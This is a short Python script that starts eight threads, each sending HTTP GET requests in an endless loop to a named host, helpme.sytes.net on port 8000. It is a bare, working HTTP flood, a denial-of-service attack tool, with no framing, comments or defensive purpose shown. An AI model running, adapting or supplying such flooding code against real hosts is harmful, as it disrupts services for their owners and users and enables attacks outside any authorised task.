import requests
import threading


def wile():
    while(True):{requests.get('http://helpme.sytes.net:8000')}


t1=threading.Thread(target=wile)
t2=threading.Thread(target=wile)
t3=threading.Thread(target=wile)
t4=threading.Thread(target=wile)
t5=threading.Thread(target=wile)
t6=threading.Thread(target=wile)
t7=threading.Thread(target=wile)
t8=threading.Thread(target=wile)
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
